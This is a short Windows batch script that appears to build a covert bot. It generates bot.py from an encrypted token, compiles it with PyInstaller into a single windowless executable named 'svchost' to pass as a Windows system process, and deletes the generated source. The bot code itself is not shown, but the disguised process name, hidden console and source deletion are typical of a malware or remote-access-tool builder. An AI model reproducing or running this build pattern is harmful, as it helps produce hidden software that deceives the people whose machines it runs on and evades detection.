@echo off
pip install -r requirements.txt
python encrypt_token.py %*
if errorlevel 1 (
    echo [!] Failed to generate bot.py script.
    exit /b 1
)
pyinstaller --onefile --noconsole --name svchost bot.py
if exist bot.py del bot.py


